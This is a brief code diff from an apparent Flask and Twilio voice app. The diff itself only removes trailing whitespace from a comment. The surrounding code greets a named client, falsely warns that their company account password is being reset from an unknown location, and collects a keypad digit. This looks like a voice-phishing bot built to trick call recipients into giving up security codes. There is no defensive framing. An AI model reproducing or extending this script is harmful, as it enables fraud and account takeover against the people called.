@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route("/voice", methods=['GET', 'POST'])
 def voice():
-    # Start a TwiML response 
+    # Start a TwiML response
     resp = VoiceResponse()
     resp.say(f",,,Hello {open('Details/Client_Name.txt', 'r').read()}, your {open('Details/Company Name.txt', 'r').read()} account password is trying to be reset from unknow location,")
     gather = Gather(num_digits=1, action='/gather', timeout=120)
